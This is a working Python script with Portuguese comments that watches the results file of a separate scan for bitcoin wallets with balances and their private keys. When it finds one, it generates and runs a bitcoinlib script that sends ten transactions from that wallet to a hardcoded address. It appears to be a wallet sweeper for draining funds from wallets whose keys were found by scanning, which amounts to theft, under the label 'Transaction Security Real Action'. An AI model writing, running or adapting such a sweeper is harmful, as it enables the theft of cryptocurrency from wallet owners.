#!/usr/bin/env python3
"""
Script de Ação Automática
Monitora a varredura e executa envios automaticamente quando encontrar saldo
"""

import json
import time
import os
import subprocess
from datetime import datetime

RESULTS_FILE = 'funded_wallets_scan.json'
BINANCE_ADDRESS = "13m3xop6RnioRX6qrnkavLekv7cvu5DuMK"
AMOUNT_PER_TX = 0.0001
NUM_TRANSACTIONS = 10

def check_for_funded_wallets():
    """Verifica se há carteiras com saldo"""
    if not os.path.exists(RESULTS_FILE):
        return None
    
    try:
        with open(RESULTS_FILE, 'r') as f:
            wallets = json.load(f)
        
        # Filtra apenas carteiras com saldo suficiente
        min_balance = (AMOUNT_PER_TX * NUM_TRANSACTIONS + 0.0005) * 100000000
        funded = [w for w in wallets if w['balance_satoshis'] >= min_balance]
        
        return funded if funded else None
    except:
        return None

def send_transactions(wallet):
    """Envia as 10 transações usando a carteira encontrada"""
    print("=" * 70)
    print("INICIANDO ENVIOS AUTOMÁTICOS")
    print("=" * 70)
    print()
    
    print(f"💰 Carteira selecionada:")
    print(f"   Endereço: {wallet['address']}")
    print(f"   Saldo: {wallet['balance_btc']:.8f} BTC")
    print(f"   Índice: {wallet['index']}")
    print()
    
    # Cria script temporário de envio
    script_content = f"""
import sys
from bitcoinlib.wallets import Wallet, wallet_delete_if_exists
import requests
import time
import json

BINANCE_ADDRESS = "{BINANCE_ADDRESS}"
AMOUNT_PER_TX = {AMOUNT_PER_TX}
NUM_TRANSACTIONS = {NUM_TRANSACTIONS}
WIF_KEY = "{wallet['private_key_wif']}"

wallet_name = "auto_sender"
wallet_delete_if_exists(wallet_name)

wallet = Wallet.create(
    name=wallet_name,
    keys=WIF_KEY,
    network='bitcoin',
    witness_type='legacy'
)

results = []

for i in range(1, NUM_TRANSACTIONS + 1):
    print(f"Transação {{i}}/{{NUM_TRANSACTIONS}}...")
    
    try:
        wallet.scan()
        amount_satoshis = int(AMOUNT_PER_TX * 100000000)
        
        tx = wallet.send_to(
            BINANCE_ADDRESS,
            amount_satoshis,
            fee=1000,
            offline=False
        )
        
        if tx:
            txid = tx.txid
            print(f"  ✓ TXID: {{txid}}")
            
            results.append({{
                'tx_num': i,
                'txid': txid,
                'amount_btc': AMOUNT_PER_TX,
                'success': True,
                'link': f"https://mempool.space/tx/{{txid}}"
            }})
            
            if i < NUM_TRANSACTIONS:
                time.sleep(5)
        else:
            print(f"  ✗ Erro ao criar transação")
            results.append({{'tx_num': i, 'success': False}})
            
    except Exception as e:
        print(f"  ✗ Erro: {{e}}")
        results.append({{'tx_num': i, 'error': str(e), 'success': False}})

# Salva resultados
with open('auto_send_results.json', 'w') as f:
    json.dump(results, f, indent=2)

print(f"\\nConcluído! {{len([r for r in results if r.get('success')])}}/{{NUM_TRANSACTIONS}} transações enviadas")

wallet_delete_if_exists(wallet_name)
"""
    
    with open('temp_auto_send.py', 'w') as f:
        f.write(script_content)
    
    # Executa envios
    print("🚀 Executando envios...")
    print()
    
    try:
        subprocess.run(['python3', 'temp_auto_send.py'], check=True)
        print()
        print("✅ Envios concluídos!")
        
        # Lê resultados
        if os.path.exists('auto_send_results.json'):
            with open('auto_send_results.json', 'r') as f:
                results = json.load(f)
            
            successful = [r for r in results if r.get('success')]
            
            print()
            print("=" * 70)
            print("RELATÓRIO DE ENVIOS")
            print("=" * 70)
            print()
            print(f"✅ Transações bem-sucedidas: {len(successful)}/{NUM_TRANSACTIONS}")
            print()
            
            if successful:
                print("📋 TXIDs:")
                for r in successful:
                    print(f"   TX #{r['tx_num']}: {r['txid']}")
                    print(f"            {r['link']}")
                
                total_sent = len(successful) * AMOUNT_PER_TX
                print()
                print(f"💰 Total enviado: {total_sent:.8f} BTC")
        
        # Remove script temporário
        os.remove('temp_auto_send.py')
        
        return True
        
    except Exception as e:
        print(f"❌ Erro ao executar envios: {e}")
        return False

def monitor_and_act():
    """Monitora e age automaticamente"""
    print("=" * 70)
    print("MONITOR AUTOMÁTICO DE VARREDURA E ENVIO")
    print("Protocolo TSRA - Transaction Security Real Action")
    print("=" * 70)
    print()
    print("⏳ Aguardando varredura encontrar carteira com saldo...")
    print("   Verificando a cada 30 segundos...")
    print()
    
    check_count = 0
    
    while True:
        try:
            check_count += 1
            
            # Verifica se encontrou carteiras
            funded_wallets = check_for_funded_wallets()
            
            if funded_wallets:
                print()
                print("🎉" * 35)
                print(f"CARTEIRA COM SALDO ENCONTRADA!")
                print("🎉" * 35)
                print()
                
                # Usa a carteira com maior saldo
                best_wallet = max(funded_wallets, key=lambda x: x['balance_satoshis'])
                
                # Envia transações
                success = send_transactions(best_wallet)
                
                if success:
                    print()
                    print("✅ Processo automático concluído com sucesso!")
                    print()
                
                break
            
            # Mostra progresso a cada 10 verificações (5 minutos)
            if check_count % 10 == 0:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Ainda procurando... ({check_count} verificações)")
            
            time.sleep(30)
            
        except KeyboardInterrupt:
            print("\n\n✋ Monitor interrompido pelo usuário")
            break
        except Exception as e:
            print(f"⚠️ Erro: {e}")
            time.sleep(30)

if __name__ == "__main__":
    monitor_and_act()

